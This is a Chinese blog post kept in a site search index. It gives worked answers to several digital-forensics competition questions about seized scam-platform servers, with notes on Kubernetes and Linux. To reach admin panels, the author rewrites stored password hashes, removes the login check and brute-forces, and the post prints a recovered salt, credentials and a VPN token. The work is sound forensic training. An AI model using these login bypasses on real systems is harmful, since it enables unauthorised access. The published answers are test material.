<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Server</title>
      <link href="/2025/05/19/%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
      <url>/2025/05/19/%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><p><strong>k8s相关知识：</strong>[<a href="https://blog.csdn.net/footless_bird/article/details/125798691?fromshare=blogdetail&sharetype=blogdetail&sharerId=125798691&sharerefer=PC&sharesource=BJYBJ&sharefrom=from_link">k8s之常用操作命令-CSDN博客</a>]</p><p><a href="https://so.csdn.net/so/search?q=K8s&spm=1001.2101.3001.7020">K8s</a>是Kubernetes的简称，是一个开源的容器编排平台，用于自动化部署、扩展和管理容器化应用程序。</p><p><strong>k8s核心组件</strong></p><p><strong>1.Master节点：</strong>K8s的控制平面，负责管理和协调整个集群。包含API Server、Scheduler、Controller Manager等组件，API Server提供了K8s的API接口，用于接收和处理用户的请求；Scheduler负责将Pod调度到合适的节点上；Controller Manager负责管理和维护集群中各种资源的状态。</p><p><strong>2.Node 节点：</strong>集群中的工作节点，用于运行容器化应用。每个Node节点上都运行着Kubelet和Container Runtime等组件，Kubelet负责与Master节点通信，接收并执行Master节点下达的任务，<strong>管理本地的容器</strong>；Container Runtime用于运行容器，如Docker、runc等。</p><p><strong>3.Pod：</strong>K8s中最小的可部署和可管理的计算单元，它可以包含一个或多个紧密相关的容器。这些容器共享网络和存储资源，通常作为一个整体被调度和管理。</p><p><strong>4.Service：</strong>用于定义一组Pod的访问策略，为Pod提供一个固定的IP地址和DNS名称，使得其他Pod或外部客户端能够通过这个固定的地址访问到后端的Pod集合，实现服务的发现和负载均衡。</p><p><strong>5.Deployment：</strong>用于管理Pod的部署和升级，<strong>用户可以通过Deployment来定义Pod的副本数量、镜像版本等信息，K8s会根据Deployment的定义自动创建和管理Pod</strong>，并在需要时进行升级和回滚操作。</p><p>19045就是这个win10 22H2的内部版本号，而小数点后面的内容是<strong>累计更新的编号</strong></p><p><img src="/img/3466870-20250228174757631-1611046550.png" alt="image-20250224173320367"></p><p><strong>核心系统目录</strong></p><table><thead><tr><th>目录</th><th>作用与内容</th><th>示例文件或子目录</th></tr></thead><tbody><tr><td><strong>&#x2F;bin</strong></td><td><strong>基础二进制命令</strong>（所有用户可用）</td><td><code>ls</code>, <code>cp</code>, <code>bash</code>, <code>cat</code></td></tr><tr><td><strong>&#x2F;sbin</strong></td><td><strong>系统管理命令</strong>（需管理员权限执行）</td><td><code>fdisk</code>, <code>iptables</code>, <code>reboot</code></td></tr><tr><td><strong>&#x2F;boot</strong></td><td><strong>系统启动文件</strong>（内核、引导加载程序）</td><td><code>vmlinuz-*</code>, <code>initramfs</code>, <code>grub/</code></td></tr><tr><td><strong>&#x2F;dev</strong></td><td><strong>设备文件</strong>（硬件或虚拟设备的接口）</td><td><code>sda</code>（硬盘）, <code>tty</code>（终端）</td></tr><tr><td><strong>&#x2F;etc</strong></td><td><strong>系统全局配置文件</strong></td><td><code>passwd</code>, <code>nginx/</code>, <code>ssh/</code></td></tr><tr><td><strong>&#x2F;lib</strong></td><td><strong>共享库文件</strong>（供 <code>/bin</code> 和 <code>/sbin</code> 使用）</td><td><code>libc.so.*</code>, <code>modules/</code>（内核模块）</td></tr><tr><td><strong>&#x2F;proc</strong></td><td><strong>内核与进程的虚拟文件系统</strong>（实时信息，非磁盘存储）</td><td><code>cpuinfo</code>, <code>meminfo</code>, 进程ID目录</td></tr><tr><td><strong>&#x2F;sys</strong></td><td><strong>硬件和内核参数的虚拟文件系统</strong>（用于调整系统行为）</td><td><code>devices/</code>, <code>kernel/</code></td></tr></tbody></table><hr><p><strong>用户与程序目录</strong></p><table><thead><tr><th>目录</th><th>作用与内容</th><th>示例文件或子目录</th></tr></thead><tbody><tr><td><strong>&#x2F;home</strong></td><td><strong>普通用户的家目录</strong>（每个用户有独立子目录）</td><td><code>/home/user1</code>, <code>/home/user2</code></td></tr><tr><td><strong>&#x2F;root</strong></td><td><strong>超级用户（root）的家目录</strong></td><td>管理员配置文件</td></tr><tr><td><strong>&#x2F;usr</strong></td><td><strong>用户程序与资源</strong>（只读数据，类似 Windows 的 <code>Program Files</code>）</td><td><code>/usr/bin</code>, <code>/usr/lib</code>, <code>/usr/share</code></td></tr><tr><td><strong>&#x2F;opt</strong></td><td><strong>第三方软件安装目录</strong>（通常用于大型商业软件）</td><td><code>/opt/google/chrome</code></td></tr><tr><td><strong>&#x2F;run</strong></td><td><strong>运行时数据</strong>（系统启动后生成的临时文件，如 PID 文件）</td><td><code>/run/sshd.pid</code></td></tr></tbody></table><hr><p><strong>数据与日志目录</strong></p><table><thead><tr><th>目录</th><th>作用与内容</th><th>示例文件或子目录</th></tr></thead><tbody><tr><td><strong>&#x2F;var</strong></td><td><strong>可变数据</strong>（日志、数据库、缓存等动态内容）</td><td><code>/var/log</code>, <code>/var/www</code>, <code>/var/lib</code></td></tr><tr><td><strong>&#x2F;tmp</strong></td><td><strong>临时文件</strong>（所有用户可读写，重启后可能清空）</td><td>临时下载文件、进程缓存</td></tr><tr><td><strong>&#x2F;mnt</strong></td><td><strong>临时挂载点</strong>（手动挂载外部设备，如U盘、硬盘）</td><td><code>/mnt/usb</code>, <code>/mnt/backup</code></td></tr><tr><td><strong>&#x2F;media</strong></td><td><strong>自动挂载点</strong>（系统自动挂载可移动设备）</td><td><code>/media/usb-drive</code></td></tr></tbody></table><hr><p><strong>特殊用途目录</strong></p><table><thead><tr><th>目录</th><th>作用与内容</th></tr></thead><tbody><tr><td><strong>&#x2F;lost+found</strong></td><td>文件系统修复后的残留文件恢复目录（每个分区独立存在）</td></tr><tr><td><strong>&#x2F;srv</strong></td><td>服务数据目录（如 Web、FTP 服务的数据文件）</td></tr><tr><td><strong>&#x2F;selinux</strong></td><td>SELinux 安全策略相关文件（仅启用 SELinux 时存在）</td></tr></tbody></table><p><strong><code>ajax.php</code> （可以找加密验证逻辑）</strong></p><p>在 Web 开发中，**<code>ajax.php</code>** 是一个常见的后端脚本文件，专门用于处理前端通过 <strong>AJAX（Asynchronous JavaScript and XML）</strong> 发送的异步请求。它的核心作用是充当 <strong>前端与后端之间的数据交互桥梁</strong>，通常用于动态更新网页内容而无需刷新页面。</p><ol><li><strong>处理数据请求与响应</strong></li></ol><ul><li><strong>接收</strong>前端通过 <code>POST</code>、<code>GET</code> 或其他 HTTP 方法发送的请求。</li><li><strong>处理</strong>请求参数（如用户输入、筛选条件等）。</li><li><strong>返回</strong> JSON、XML 或 HTML 格式的响应数据。</li></ul><ol start="2"><li><strong>常见应用场景</strong></li></ol><table><thead><tr><th>场景</th><th>示例</th><th>返回数据示例</th></tr></thead><tbody><tr><td><strong>表单提交</strong></td><td>用户注册、登录、评论提交</td><td><code>&#123; &quot;status&quot;: &quot;success&quot; &#125;</code></td></tr><tr><td><strong>动态加载内容</strong></td><td>分页加载文章、滚动加载更多商品</td><td>HTML 片段或 JSON 数据列表</td></tr><tr><td><strong>实时搜索建议</strong></td><td>搜索框输入时自动补全</td><td><code>[&quot;apple&quot;, &quot;banana&quot;, &quot;cherry&quot;]</code></td></tr><tr><td><strong>用户交互反馈</strong></td><td>点赞、收藏、投票</td><td>更新后的点赞数</td></tr><tr><td><strong>数据校验</strong></td><td>检查用户名是否已注册</td><td><code>&#123; &quot;valid&quot;: false &#125;</code></td></tr></tbody></table><p><strong>java后端的登录验证一般在app&#x2F;lib&#x2F;action中</strong></p><p><strong><code>history</code>命令可以了解服务器的配置流程（不知道网站结构时）</strong></p><h2 id="2025獬豸（k8s集群）"><a href="#2025獬豸（k8s集群）" class="headerlink" title="2025獬豸（k8s集群）"></a>2025獬豸（k8s集群）</h2><h3 id="2-该集群创建时间是？"><a href="#2-该集群创建时间是？" class="headerlink" title="2.该集群创建时间是？"></a>2.该集群创建时间是？</h3><p>k8s的相关内容<code>kubectl get namespace default -o yaml</code>，大概就是<code>kubectl get namespace &lt;命名空间名&gt; -o(输出方式) yaml(格式)</code>。<strong>YAML 格式（</strong>一种人类可读的数据序列化格式<strong>）</strong></p><p>其实有点像docker容器，还可以使输出更精简<code>kubectl get namespace default -o jsonpath=&#39;&#123;.metadata.creationTimestamp&#125;&#39;</code>。这两种方法都能输出创建时间。</p><p><img src="/img/image-20250419140741556.png" alt="image-20250419140741556"></p><h3 id="3-该集群共有多少个命名空间？-标准格式：100"><a href="#3-该集群共有多少个命名空间？-标准格式：100" class="headerlink" title="3.该集群共有多少个命名空间？[标准格式：100]"></a>3.该集群共有多少个命名空间？[标准格式：100]</h3><p><strong>7</strong></p><p><code>kubectl get namespaces</code></p><p><img src="/img/image-20250419141020294.png" alt="image-20250419141020294"></p><h3 id="4-该集群所有命名空间内总共有多少个pod？-标准格式：100"><a href="#4-该集群所有命名空间内总共有多少个pod？-标准格式：100" class="headerlink" title="4.该集群所有命名空间内总共有多少个pod？[标准格式：100]"></a>4.该集群所有命名空间内总共有多少个pod？[标准格式：100]</h3><p><strong>19</strong></p><p><img src="/img/image-20250419200502362.png" alt="image-20250419200502362"></p><h3 id="5-请给出该集群所使用的cni网络插件及其版本？-标准格式：abc-V1-1-1"><a href="#5-请给出该集群所使用的cni网络插件及其版本？-标准格式：abc-V1-1-1" class="headerlink" title="5.请给出该集群所使用的cni网络插件及其版本？[标准格式：abc-V1.1.1]"></a>5.请给出该集群所使用的cni网络插件及其版本？[标准格式：abc-V1.1.1]</h3><p><strong>flannel-V1.0.0</strong></p><p><code>kubectl get pod -A</code>列出所有网络组件</p><p><img src="/img/image-20250419141621137.png" alt="image-20250419141621137"></p><p>通过查看pod的镜像，查看它的版本号</p><p><img src="/img/image-20250419141828135.png" alt="image-20250419141828135"></p><p>错误答案：</p><p><img src="/img/image-20250419200255092.png" alt="image-20250419200255092"></p><p><strong>CNI 配置规范版本</strong> (<code>cniVersion: 0.3.1</code>)</p><ul><li><strong>作用</strong>：<br>表示当前配置文件 <code>10-flannel.conflist</code> 遵循的 <strong>CNI（容器网络接口）规范版本</strong>，与 Flannel 自身版本无关。</li></ul><h3 id="6-其中打金平台的后台登录地址跳转文件是？-标准格式：abc-php"><a href="#6-其中打金平台的后台登录地址跳转文件是？-标准格式：abc-php" class="headerlink" title="6.其中打金平台的后台登录地址跳转文件是？[标准格式：abc.php]"></a>6.其中打金平台的后台登录地址跳转文件是？[标准格式：abc.php]</h3><p><strong>WIdbdgd1Us.php</strong></p><ol><li><p>需要打开面板下的nginx服务，要不然打开网页就是会是hello centos</p></li><li><p>需要改hosts文件，让url被解析到指定ip上，才能打开网页</p><ul><li>添加域名解析规则：在 <code>hosts</code> 文件末尾添加一行，格式为：<code>目标IP 域名</code></li></ul><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">192.168.1.100</span> example.com<br></code></pre></td></tr></table></figure><ul><li>保存并生效，刷新 DNS 缓存：<code>ipconfig /flushdns</code></li></ul></li></ol><p>进入bt界面查看文件</p><p><img src="/img/image-20250419144059745.png" alt="image-20250419144059745"></p><p>直接访问界面</p><p><img src="/img/image-20250419143708930.png" alt="image-20250419143708930"></p><p>尝试访问<code>www.mtbtsdafda.com/WIdbdgd1Us.php</code>结果</p><p><img src="/img/image-20250419143842630.png" alt="image-20250419143842630"></p><h3 id="7-其中打金平台密码加密算法是？-标准格式：abc"><a href="#7-其中打金平台密码加密算法是？-标准格式：abc" class="headerlink" title="7.其中打金平台密码加密算法是？[标准格式：abc]"></a>7.其中打金平台密码加密算法是？[标准格式：abc]</h3><p><strong>sha1</strong></p><p><img src="/img/image-20250419144245738.png" alt="image-20250419144245738"></p><p>也可以分析重置密码的过程</p><p><img src="/img/image-20250419145922088.png" alt="image-20250419145922088"></p><h3 id="8-其中打金平台中”13067137585”用户的累计产量有多少？-标准格式：100-00"><a href="#8-其中打金平台中”13067137585”用户的累计产量有多少？-标准格式：100-00" class="headerlink" title="8.其中打金平台中”13067137585”用户的累计产量有多少？[标准格式：100.00]"></a>8.其中打金平台中”13067137585”用户的累计产量有多少？[标准格式：100.00]</h3><p><strong>43853.21</strong></p><p>需要先ssh连接到服务器，再从服务器本地访问数据库，在ds_member中看到手机号，修改密码为sha1（7c4a8d09ca3762af61e59520943dc26494f8941b）明文：123456，后登录查看</p><p><img src="/img/image-20250419151514189.png" alt="image-20250419151514189"></p><img src="img/image-20250419151404842.png" alt="image-20250419151404842" style="zoom: 67%;" /><h3 id="9-其中打金平台会员组最高溢价比例是多少？-标准格式：10-00"><a href="#9-其中打金平台会员组最高溢价比例是多少？-标准格式：10-00" class="headerlink" title="9.其中打金平台会员组最高溢价比例是多少？[标准格式：10.00]"></a>9.其中打金平台会员组最高溢价比例是多少？[标准格式：10.00]</h3><p><strong>1.70</strong></p><p>在ds_user表中修改密码，登录后台界面可以看到</p><p><img src="/img/image-20250419151941815.png" alt="image-20250419151941815"></p><h3 id="10-其中打金平台会员推广人数最多的会员其姓名是？-标准格式：名字"><a href="#10-其中打金平台会员推广人数最多的会员其姓名是？-标准格式：名字" class="headerlink" title="10.其中打金平台会员推广人数最多的会员其姓名是？[标准格式：名字]"></a>10.其中打金平台会员推广人数最多的会员其姓名是？[标准格式：名字]</h3><p><strong>李奕欣</strong></p><p>数据库中有parent_id列，查询count最大</p><img src="img/image-20250419152516282.png" alt="image-20250419152516282" style="zoom:67%;" /><img src="img/image-20250419152658224.png" alt="image-20250419152658224" style="zoom:67%;" /><h3 id="12-其中金瑞币（JINRUI-COIN）平台图片上传平台是哪种类型？-标准格式：腾讯云ABC"><a href="#12-其中金瑞币（JINRUI-COIN）平台图片上传平台是哪种类型？-标准格式：腾讯云ABC" class="headerlink" title="12.其中金瑞币（JINRUI COIN）平台图片上传平台是哪种类型？[标准格式：腾讯云ABC]"></a>12.其中金瑞币（JINRUI COIN）平台图片上传平台是哪种类型？[标准格式：腾讯云ABC]</h3><p><strong>阿里云OSS</strong></p><p><img src="/img/image-20250419153729738.png" alt="image-20250419153729738"></p><h3 id="13-其中金瑞币平台手机直充接口是什么？-标准格式：http-xxx-xxx-xxx-xxx"><a href="#13-其中金瑞币平台手机直充接口是什么？-标准格式：http-xxx-xxx-xxx-xxx" class="headerlink" title="13.其中金瑞币平台手机直充接口是什么？[标准格式：http://xxx.xxx.xxx/xxx]"></a>13.其中金瑞币平台手机直充接口是什么？[标准格式：<a href="http://xxx.xxx.xxx/xxx]">http://xxx.xxx.xxx/xxx]</a></h3><p><code>http://op.juhe.cn/ofpay/mobile/onlineorder</code></p><p>先找到后台登录地址，可以查看bt日志</p><p><img src="/img/image-20250419160603804.png" alt="image-20250419160603804"></p><p>后台登录地址：<code>http://www.gsjksu2kig.com/admin.php</code></p><p>查看密码加密逻辑：加盐md5（代码将密码与系统配置的盐值拼接，再进行md5哈希），修改数据库密码</p><p><img src="/img/image-20250419154048166.png" alt="image-20250419154048166"></p><p>先找到salt：<code>GWwRbMOPJYZCvE5gembG</code></p><p><img src="/img/image-20250419155847955.png" alt="image-20250419155847955"></p><p>生成一个密码：<code>89a3c60d437512217b2daed9c5b2e58e</code>，替换数据库的密码（管理员的密码就是123456）绷！</p><p><img src="/img/image-20250419163253894.png" alt="image-20250419163253894"></p><p>进入后台</p><p><img src="/img/image-20250419164010328.png" alt="image-20250419164010328"></p><p>找不到，暴力</p><p><img src="/img/image-20250419164320804.png" alt="image-20250419164320804"></p><h3 id="18-二号集群节点有源代码的网站目录有几个？（正在运行的除外）-标准格式：1"><a href="#18-二号集群节点有源代码的网站目录有几个？（正在运行的除外）-标准格式：1" class="headerlink" title="18.二号集群节点有源代码的网站目录有几个？（正在运行的除外）[标准格式：1]"></a>18.二号集群节点有源代码的网站目录有几个？（正在运行的除外）[标准格式：1]</h3><p><strong>5</strong></p><p>搜索包含 .php 文件的目录（排除缓存目录）:<code>find / -type f -name &quot;*.php&quot; -exec dirname &#123;&#125; \; | sort -u</code>，有很多，opt主要存放第三方的文件，除了&#x2F;www&#x2F;wwroot中的是正在运行，其余有5个</p><p><img src="/img/image-20250419170601174.png" alt="image-20250419170601174"></p><h3 id="19-二号集群节点memcached端口是？-标准格式：100"><a href="#19-二号集群节点memcached端口是？-标准格式：100" class="headerlink" title="19.二号集群节点memcached端口是？[标准格式：100]"></a>19.二号集群节点memcached端口是？[标准格式：100]</h3><p><strong>11211</strong></p><p>直接看端口：</p><p><img src="/img/image-20250419171056045.png" alt="image-20250419171056045"></p><h3 id="20-盲盒平台中余额最多的用户是？-标准格式：AbC1d"><a href="#20-盲盒平台中余额最多的用户是？-标准格式：AbC1d" class="headerlink" title="20.盲盒平台中余额最多的用户是？[标准格式：AbC1d]"></a>20.盲盒平台中余额最多的用户是？[标准格式：AbC1d]</h3><p><strong>ZrAuyMT1tyo</strong></p><p>常规看数据库</p><p><img src="/img/image-20250419172032523.png" alt="image-20250419172032523"></p><h3 id="21-盲盒平台可选二级域名有多少个？-标准格式：100"><a href="#21-盲盒平台可选二级域名有多少个？-标准格式：100" class="headerlink" title="21.盲盒平台可选二级域名有多少个？[标准格式：100]"></a>21.盲盒平台可选二级域名有多少个？[标准格式：100]</h3><p><strong>13</strong></p><p>继续找后台管理（md没在login，在ajax）的加密逻辑：用户名与密码的md5</p><p><img src="/img/image-20250419173754469.png" alt="image-20250419173754469"></p><p>生成新密码：<code>a66abb5684c45962d887564f08346e8d</code></p><p>进入后台，查看：</p><p><img src="/img/image-20250419174543729.png" alt="image-20250419174543729"></p><h3 id="24-借贷平台（www-jiedai0rmr-com）中验证码发送接口域名是？-标准格式：http-xxx-xxx-xxx"><a href="#24-借贷平台（www-jiedai0rmr-com）中验证码发送接口域名是？-标准格式：http-xxx-xxx-xxx" class="headerlink" title="24.借贷平台（www.jiedai0rmr.com）中验证码发送接口域名是？[标准格式：http://xxx.xxx.xxx/]"></a>24.借贷平台（<a href="http://www.jiedai0rmr.com）中验证码发送接口域名是？[标准格式：http://xxx.xxx.xxx/]">www.jiedai0rmr.com）中验证码发送接口域名是？[标准格式：http://xxx.xxx.xxx/]</a></h3><p><code>http://api.smsbao.com/</code></p><p>找到后台登录</p><p><img src="/img/image-20250419182059028.png" alt="image-20250419182059028"></p><p>看日志，找到后台：<code>http://www.jiedai0rmr.com/index.php?g=Admin&amp;m=Main&amp;a=index</code></p><p><img src="/img/image-20250419202149812.png" alt="image-20250419202149812"></p><p>删除密码验证逻辑，任意密码登录</p><p><img src="/img/image-20250419202425749.png" alt="image-20250419202425749"></p><p>还是找不到，回归暴力</p><p><img src="/img/3466870-20250228174756559-1178903427.png" alt="image-20250228165748705"></p><h3 id="30-综合该集群一共有多少个网站数据库？-标准格式：100"><a href="#30-综合该集群一共有多少个网站数据库？-标准格式：100" class="headerlink" title="30.综合该集群一共有多少个网站数据库？[标准格式：100]"></a>30.综合该集群一共有多少个网站数据库？[标准格式：100]</h3><p><strong>7</strong></p><p><img src="/img/image-20250419204326043.png" alt="image-20250419204326043"></p><h2 id="2024fic（esxi集群）"><a href="#2024fic（esxi集群）" class="headerlink" title="2024fic（esxi集群）"></a>2024fic（esxi集群）</h2><h3 id="rocketchat服务器"><a href="#rocketchat服务器" class="headerlink" title="rocketchat服务器"></a>rocketchat服务器</h3><p>火眼本地重构</p><p>但是一开始xshell也连不上，查看配置文件：<code>nano /etc/network/interfaces</code></p><p><img src="/img/image-20250422223732871.png" alt="image-20250422223732871"></p><p>lo是loopback环回地址所以把dhcp改成loopback</p><p>同时查看网卡是ens160不是192</p><p><img src="/img/image-20250422224000206.png" alt="image-20250422224000206"></p><p>修改后保存可以看到内网地址：<code>192.168.8.131</code></p><p><img src="/img/image-20250422224335975.png" alt="image-20250422224335975"></p><p>常规bt</p><p><img src="/img/image-20250422224616941.png" alt="image-20250422224616941"></p><h4 id="31-rocketchat服务器中，有几个真实用户？"><a href="#31-rocketchat服务器中，有几个真实用户？" class="headerlink" title="31.rocketchat服务器中，有几个真实用户？"></a>31.rocketchat服务器中，有几个真实用户？</h4><p><code>3</code></p><p>在Windows中找到端口为3000，登录地址为&#x2F;home，账号：<code>admin@admin.com</code>，密码：<code>Zhao</code>，登录进入网站</p><p><img src="/img/image-20250422225614211.png" alt="image-20250422225614211"></p><h4 id="32-roketchat服务器中，聊天服务的端口号是？"><a href="#32-roketchat服务器中，聊天服务的端口号是？" class="headerlink" title="32. roketchat服务器中，聊天服务的端口号是？"></a>32. roketchat服务器中，聊天服务的端口号是？</h4><p><code>3000</code></p><h4 id="33-rocketchat服务器中，聊天服务的管理员的邮箱是？"><a href="#33-rocketchat服务器中，聊天服务的管理员的邮箱是？" class="headerlink" title="33.rocketchat服务器中，聊天服务的管理员的邮箱是？"></a>33.rocketchat服务器中，聊天服务的管理员的邮箱是？</h4><p><code>admin@admin.com</code></p><p><img src="/img/image-20250422230004946.png" alt="image-20250422230004946"></p><h4 id="34-rocketchat服务器中，聊天服务使用的数据库的版本号是？"><a href="#34-rocketchat服务器中，聊天服务使用的数据库的版本号是？" class="headerlink" title="34.rocketchat服务器中，聊天服务使用的数据库的版本号是？"></a>34.rocketchat服务器中，聊天服务使用的数据库的版本号是？</h4><p><code>5.0.24</code></p><p><img src="/img/image-20250422230107791.png" alt="image-20250422230107791"></p><h4 id="35-rocketchat服务器中，最大的文件上传大小是？（以字节为单位）"><a href="#35-rocketchat服务器中，最大的文件上传大小是？（以字节为单位）" class="headerlink" title="35.rocketchat服务器中，最大的文件上传大小是？（以字节为单位）"></a>35.rocketchat服务器中，最大的文件上传大小是？（以字节为单位）</h4><p><code>104857600</code></p><p><img src="/img/image-20250422230817520.png" alt="image-20250422230817520"></p><h4 id="36-rocketchat服务器中，管理员账号的创建时间为："><a href="#36-rocketchat服务器中，管理员账号的创建时间为：" class="headerlink" title="36.rocketchat服务器中，管理员账号的创建时间为："></a>36.rocketchat服务器中，管理员账号的创建时间为：</h4><p><code>B. 2024/3/14 8:19:54</code></p><p>发现数据库运行在docker中，查看容器元数据：<code>docker inspect 929dad307aa4 </code>，可以看到空密码登录，以及docker的ip：<code>172.18.0.2</code></p><p><img src="/img/image-20250423132730581.png" alt="image-20250423132730581"></p><p><img src="/../../../../../AppData/Roaming/Typora/typora-user-images/image-20250423132512886.png" alt="image-20250423132512886"></p><p>连接数据库，</p><p><img src="/img/image-20250423131648686.png" alt="image-20250423131648686"></p><p><strong>A. 2024&#x2F;3&#x2F;14 8:18:54</strong></p><p><strong>B. 2024&#x2F;3&#x2F;14 8:19:54</strong></p><p><strong>C. 2024&#x2F;3&#x2F;14 8:17:54</strong></p><p><strong>D. 2024&#x2F;3&#x2F;14 8:15:54</strong></p><h4 id="37-rocketchat服务器中，技术员提供的涉诈网站地址是："><a href="#37-rocketchat服务器中，技术员提供的涉诈网站地址是：" class="headerlink" title="37.rocketchat服务器中，技术员提供的涉诈网站地址是："></a>37.rocketchat服务器中，技术员提供的涉诈网站地址是：</h4><p><code>http://172.16.80.47</code></p><p><img src="/img/image-20250422230539231.png" alt="image-20250422230539231"></p><h3 id="rocketchat服务器-1"><a href="#rocketchat服务器-1" class="headerlink" title="rocketchat服务器"></a>rocketchat服务器</h3><h4 id="41-分析openwrt镜像，该系统的主机名为："><a href="#41-分析openwrt镜像，该系统的主机名为：" class="headerlink" title="41.分析openwrt镜像，该系统的主机名为："></a>41.分析openwrt镜像，该系统的主机名为：</h4><p><code>iStoreOS</code></p><h4 id="42-分析openwrt镜像，该系统的内核版本为："><a href="#42-分析openwrt镜像，该系统的内核版本为：" class="headerlink" title="42.分析openwrt镜像，该系统的内核版本为："></a>42.分析openwrt镜像，该系统的内核版本为：</h4><p><code>5.10.201</code></p><h4 id="43-分析openwrt镜像，该静态ip地址为："><a href="#43-分析openwrt镜像，该静态ip地址为：" class="headerlink" title="43.分析openwrt镜像，该静态ip地址为："></a>43.分析openwrt镜像，该静态ip地址为：</h4><p><code>192.168.8.5</code></p><p>由于我仿真使用的DHCP，查看Windows访问记录</p><h4 id="44-分析openwrt镜像，所用网卡的名称为："><a href="#44-分析openwrt镜像，所用网卡的名称为：" class="headerlink" title="44.分析openwrt镜像，所用网卡的名称为："></a>44.分析openwrt镜像，所用网卡的名称为：</h4><p><code>br-lan</code></p><h4 id="45-分析openwrt镜像，该系统中装的docker的版本号为："><a href="#45-分析openwrt镜像，该系统中装的docker的版本号为：" class="headerlink" title="45.分析openwrt镜像，该系统中装的docker的版本号为："></a>45.分析openwrt镜像，该系统中装的docker的版本号为：</h4><p><code>20.10.22</code></p><h4 id="46-分析openwrt镜像，nastools的配置文件路径为："><a href="#46-分析openwrt镜像，nastools的配置文件路径为：" class="headerlink" title="46.分析openwrt镜像，nastools的配置文件路径为："></a>46.分析openwrt镜像，nastools的配置文件路径为：</h4><p><code>/root/Configs/NasTools</code></p><p>查看是否由docker安装：<code>docker ps</code></p><p><img src="/img/image-20250423134013094.png" alt="image-20250423134013094"></p><p>在查看容器元数据：<code>docker inspect aa1220450857 | grep &quot;Mounts&quot; -A 10</code></p><p><img src="/img/image-20250423134302485.png" alt="image-20250423134302485"></p><h4 id="47-分析openwrt镜像，使用的vpn代理软件为"><a href="#47-分析openwrt镜像，使用的vpn代理软件为" class="headerlink" title="47.分析openwrt镜像，使用的vpn代理软件为:"></a>47.分析openwrt镜像，使用的vpn代理软件为:</h4><p><code>PassWall2</code></p><p><img src="/img/image-20250423135715046.png" alt="image-20250423135715046"></p><h4 id="48-分析openwrt镜像，vpn实际有多少个可用节点"><a href="#48-分析openwrt镜像，vpn实际有多少个可用节点" class="headerlink" title="48.分析openwrt镜像，vpn实际有多少个可用节点?"></a>48.分析openwrt镜像，vpn实际有多少个可用节点?</h4><p><code>54</code></p><p><img src="/img/image-20250423140008672.png" alt="image-20250423140008672"></p><h4 id="49-分析openwrt镜像，节点socks的监听端口是多少"><a href="#49-分析openwrt镜像，节点socks的监听端口是多少" class="headerlink" title="49.分析openwrt镜像，节点socks的监听端口是多少?"></a>49.分析openwrt镜像，节点socks的监听端口是多少?</h4><p><code>1070</code></p><p><img src="/img/image-20250423135835075.png" alt="image-20250423135835075"></p><h4 id="50-分析openwrt镜像，vpn的订阅链接是"><a href="#50-分析openwrt镜像，vpn的订阅链接是" class="headerlink" title="50.分析openwrt镜像，vpn的订阅链接是:"></a>50.分析openwrt镜像，vpn的订阅链接是:</h4><p><code>https://pqjc.site/api/v1/client/subscribe?token=243d7bf31ca985f8d496ce078333196a</code></p><p><img src="/img/image-20250423135856395.png" alt="image-20250423135856395"></p><h2 id="2024数证"><a href="#2024数证" class="headerlink" title="2024数证"></a>2024数证</h2><h4 id="1-对服务器检材进行分析，站点服务器可能是从哪个云服务平台上调证过来的？（填写汉字，答案格式：亿速云）-2分"><a href="#1-对服务器检材进行分析，站点服务器可能是从哪个云服务平台上调证过来的？（填写汉字，答案格式：亿速云）-2分" class="headerlink" title="1.对服务器检材进行分析，站点服务器可能是从哪个云服务平台上调证过来的？（填写汉字，答案格式：亿速云） (2分)"></a>1.对服务器检材进行分析，站点服务器可能是从哪个云服务平台上调证过来的？（填写汉字，答案格式：亿速云） (2分)</h4><p><code>阿里云</code></p><h4 id="2-对服务器检材进行分析，站点服务器中数据库的密码是？（按实际值填写）-2分"><a href="#2-对服务器检材进行分析，站点服务器中数据库的密码是？（按实际值填写）-2分" class="headerlink" title="2.对服务器检材进行分析，站点服务器中数据库的密码是？（按实际值填写） (2分)"></a>2.对服务器检材进行分析，站点服务器中数据库的密码是？（按实际值填写） (2分)</h4><p><code>Sxy000**</code></p><p><code>history</code>查看配置，可以看到后台启动一个Java应用程序，其位置在 <code>/data/cal-0.0.1-SNAPSHOT.jar</code></p><p><img src="/img/image-20250423221217245.png" alt="image-20250423221217245"></p><p>查看java命令：可以看到Spring Boot会使用<code>sxj</code>配置文件中的设置来配置数据源</p><p><img src="/img/image-20250424125557645.png" alt="image-20250424125557645"></p><p>查看java配置先解压出来，查看sxj配置文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 解压整个JAR包</span><br>jar xf cal-0.0.1-SNAPSHOT.jar BOOT-INF/classes/<br></code></pre></td></tr></table></figure><p><img src="/img/image-20250424130022756.png" alt="image-20250424130022756"></p><h4 id="3-对服务器检材进行分析，站点服务器用于提供服务发现的工具名是？（答案格式：zookeeper）-4分"><a href="#3-对服务器检材进行分析，站点服务器用于提供服务发现的工具名是？（答案格式：zookeeper）-4分" class="headerlink" title="3.对服务器检材进行分析，站点服务器用于提供服务发现的工具名是？（答案格式：zookeeper） (4分)"></a>3.对服务器检材进行分析，站点服务器用于提供服务发现的工具名是？（答案格式：zookeeper） (4分)</h4><p><code>consul</code></p><p><img src="/img/image-20250423154306414.png" alt="image-20250423154306414"></p><h4 id="4-对服务器检材进行分析，站点服务器数据库配置文件名是？（答案格式：database-php）-2分"><a href="#4-对服务器检材进行分析，站点服务器数据库配置文件名是？（答案格式：database-php）-2分" class="headerlink" title="4.对服务器检材进行分析，站点服务器数据库配置文件名是？（答案格式：database.php） (2分)"></a>4.对服务器检材进行分析，站点服务器数据库配置文件名是？（答案格式：database.php） (2分)</h4><p><code>application-sxj.yaml</code>（见题2）</p><h4 id="5-对服务器检材进行分析，该网站涉及的APP名称是？（答案格式：微信）-2分"><a href="#5-对服务器检材进行分析，该网站涉及的APP名称是？（答案格式：微信）-2分" class="headerlink" title="5.对服务器检材进行分析，该网站涉及的APP名称是？（答案格式：微信） (2分)"></a>5.对服务器检材进行分析，该网站涉及的APP名称是？（答案格式：微信） 